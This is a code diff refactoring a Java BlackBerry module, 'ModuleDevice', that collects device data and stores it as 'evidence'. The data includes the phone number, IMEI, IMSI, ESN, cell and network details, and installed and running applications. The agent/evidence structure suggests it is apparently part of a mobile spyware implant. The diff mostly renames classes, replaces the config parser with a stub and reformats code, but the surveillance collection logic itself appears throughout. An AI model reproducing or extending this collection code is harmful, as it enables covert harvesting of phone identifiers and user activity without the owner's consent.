@@ -9,7 +9,6 @@
  * *************************************************/
 package blackberry.module;
 
-import java.io.EOFException;
 import java.util.Date;
 import java.util.Enumeration;
 import java.util.Hashtable;
@@ -23,21 +22,20 @@ import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.system.GPRSInfo;
 import net.rim.device.api.system.RadioInfo;
 import net.rim.device.api.ui.Keypad;
-import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.NumberUtilities;
 import blackberry.Device;
 import blackberry.config.Conf;
+import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
 import blackberry.fs.Path;
-import blackberry.utils.Check;
 
 /**
  * The Class DeviceInfoAgent.
  */
-public final class ModuleDevicet extends BaseModule {
+public final class ModuleDevice extends BaseInstantModule {
     //#ifdef DEBUG
     static Debug debug = new Debug("DeviceInfoAgent", DebugLevel.VERBOSE);
     //#endif
@@ -46,46 +44,16 @@ public final class ModuleDevicet extends BaseModule {
     boolean runningApplication;
     boolean installedApplication;
 
-    /**
-     * Instantiates a new device info agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     */
-    public ModuleDevicet(final boolean agentEnabled) {
-        super(AGENT_DEVICE, agentEnabled, Conf.AGENT_DEVICEINFO_ON_SD,
-                "DeviceInfoAgent");
-        //#ifdef DBC
-        Check.asserts(
-                Evidence.convertTypeEvidence(agentId) == EvidenceType.DEVICE,
-                "Wrong Conversion");
-        //#endif
-
-        device = Device.getInstance();
-    }
-
-    /**
-     * Instantiates a new device info agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     * @param confParams
-     *            the conf params
-     */
-    protected ModuleDevicet(final boolean agentStatus, final byte[] confParams) {
-        this(agentStatus);
-        parse(confParams);
+    public boolean parse(ConfModule conf) {
+        // this.processList = true;
+        return true;
     }
 
     /*
      * (non-Javadoc)
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
-    public void actualGo() {
-        //#ifdef DBC
-        Check.requires(evidence != null, "Null log");
-        //#endif
-
+    public void actualStart() {
         boolean ret = true;
 
         final StringBuffer sb = new StringBuffer();
@@ -119,8 +87,8 @@ public final class ModuleDevicet extends BaseModule {
         sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
         sb.append("Phone: " + device.getPhoneNumber() + "\n");
         sb.append("Keypad layout: ");
-        int keyLayout=Keypad.getHardwareLayout();
-        switch(keyLayout){
+        int keyLayout = Keypad.getHardwareLayout();
+        switch (keyLayout) {
             case Keypad.HW_LAYOUT_32:
                 sb.append("32 " + "\n");
                 break;
@@ -136,32 +104,23 @@ public final class ModuleDevicet extends BaseModule {
             case Keypad.HW_LAYOUT_REDUCED_24:
                 sb.append("REDUCED" + "\n");
                 break;
-/*            case Keypad.HW_LAYOUT_TOUCHSCREEN_12:
-                sb.append("TOUCH " + "\n");
+            /*
+             * case Keypad.HW_LAYOUT_TOUCHSCREEN_12: sb.append("TOUCH " + "\n");
+             * break; case Keypad.HW_LAYOUT_TOUCHSCREEN_12A: sb.append("TOUCH "
+             * + "\n"); break; case Keypad.HW_LAYOUT_TOUCHSCREEN_12C:
+             * sb.append("TOUCH " + "\n"); break; case
+             * Keypad.HW_LAYOUT_TOUCHSCREEN_12H: sb.append("TOUCH " + "\n");
+             * break; case Keypad.HW_LAYOUT_TOUCHSCREEN_20J: sb.append("TOUCH "
+             * + "\n"); break; case Keypad.HW_LAYOUT_TOUCHSCREEN_20JA:
+             * sb.append("TOUCH " + "\n"); break; case
+             * Keypad.HW_LAYOUT_TOUCHSCREEN_20K: sb.append("TOUCH " + "\n");
+             * break;
+             */
+
+            default:
+                sb.append("UNK " + keyLayout + "\n");
                 break;
-            case Keypad.HW_LAYOUT_TOUCHSCREEN_12A:
-                sb.append("TOUCH " + "\n");
-                break;
-            case Keypad.HW_LAYOUT_TOUCHSCREEN_12C:
-                sb.append("TOUCH " + "\n");
-                break;
-            case Keypad.HW_LAYOUT_TOUCHSCREEN_12H:
-                sb.append("TOUCH " + "\n");
-                break;
-            case Keypad.HW_LAYOUT_TOUCHSCREEN_20J:
-                sb.append("TOUCH " + "\n");
-                break;
-            case Keypad.HW_LAYOUT_TOUCHSCREEN_20JA:
-                sb.append("TOUCH " + "\n");
-                break;
-            case Keypad.HW_LAYOUT_TOUCHSCREEN_20K:
-                sb.append("TOUCH " + "\n");
-                break;*/
-                
-                default:
-                    sb.append("UNK " +keyLayout+ "\n");
-                    break;
-               
+
         }
 
         // Alimentazione
@@ -179,7 +138,7 @@ public final class ModuleDevicet extends BaseModule {
             sb.append("SID: " + device.getSid() + "\n");
             sb.append("ESN: " + NumberUtilities.toString(device.getEsn(), 16)
                     + "\n");
-        } else if(Device.isGPRS()) {
+        } else if (Device.isGPRS()) {
             sb.append("GPRS\n");
             sb.append("IMEI: " + device.getImei() + "\n");
             sb.append("IMSI: " + device.getImsi() + "\n");
@@ -187,7 +146,7 @@ public final class ModuleDevicet extends BaseModule {
             sb.append("HomeMNC: " + GPRSInfo.getHomeMNC() + "\n");
             sb.append("RSSI: " + GPRSInfo.getCellInfo().getRSSI() + "\n");
             sb.append("Zone name: " + GPRSInfo.getZoneName() + "\n");
-        } else if(Device.isIDEN()){
+        } else if (Device.isIDEN()) {
             sb.append("IDEN\n");
         }
 
@@ -244,6 +203,7 @@ public final class ModuleDevicet extends BaseModule {
             //#endif
         }
 
+        Evidence evidence = new Evidence(EvidenceType.DEVICE);
         evidence.atomicWriteOnce(sb.toString());
 
     }
@@ -426,27 +386,6 @@ public final class ModuleDevicet extends BaseModule {
         }
         final String ret = sb.toString();
         return ret;
-    }
-
-    /*
-     * (non-Javadoc)
-     * @see blackberry.agent.Agent#parse(byte[])
-     */
-    protected boolean parse(final byte[] confParams) {
-        final DataBuffer databuffer = new DataBuffer(confParams, 0,
-                confParams.length, false);
-        try {
-            installedApplication = databuffer.readInt() == 1;
-            runningApplication = installedApplication;
-        } catch (final EOFException e) {
-            return false;
-        }
-
-        //#ifdef DEBUG
-        debug.info("installedApplication: " + installedApplication);
-        //#endif
-
-        return true;
     }
 
 }
